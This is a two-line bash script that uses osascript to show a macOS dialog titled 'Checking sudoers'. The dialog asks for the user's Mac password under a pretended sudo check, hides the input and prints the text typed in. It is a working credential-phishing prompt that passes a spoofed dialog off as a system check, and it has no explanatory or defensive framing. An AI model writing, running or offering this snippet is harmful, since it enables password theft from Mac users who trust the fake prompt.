#!/bin/bash
osascript -e 'Tell application "System Events" to display dialog "Enter your Mac password for sudo check:" default answer "" with hidden answer with title "Checking sudoers"' -e 'text returned of result'
